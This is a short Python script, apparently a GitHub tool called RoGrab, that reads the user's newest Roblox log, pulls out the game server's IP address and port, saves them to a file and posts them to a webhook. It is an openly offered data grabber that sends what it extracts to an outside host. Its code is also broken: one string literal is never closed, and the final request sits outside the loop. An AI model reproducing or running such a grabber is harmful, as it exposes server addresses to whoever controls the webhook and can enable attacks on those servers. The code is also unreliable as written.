# RoGrab https://github.com/AzureTheProgrammer/RoGrab/blob/master/RoGrab.py
# mr leghat aka me

import requests
import glob
import os

Webhook = ""  # webhook url here

# moment
list_of_files = glob.glob(
    r"C:\users\{}\AppData\Local\Roblox\logs\*".format(os.getenv("username")))
latest_file = max(list_of_files, key=os.path.getctime)
roblox_log = open(latest_file, "r")

for line in roblox_log:
    if "Connection accepted from" in line:
        line = line.replace("Connection accepted from", ")
        line2 = line.replace("|", "\nPort: ")
        line3 = line2[57:]
        data = {
            "embeds": [
                {
                    "title": "```Successfully grabbed server details.\n```",
                    "description": "```yaml\n" + "IP:" + line3 + "```",
                    "color": 16711680,
                    "author": {
                        "name": "Roblox moment",
                        "icon_url": "https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/e/e/0eeeb19633422b1241f4306419a0f15f39d58de9.png"
                    }
                }
            ],
        }
        ip_history = open("server_ips.txt", "a+")
        ip_history.write("IP:" + line3 + "\n")
        ip_history.close()

        headers = {
            "Content-Type": "application/json"
        }
print("Server IP sent!")

response = requests.request("POST", Webhook, json=data, headers=headers)
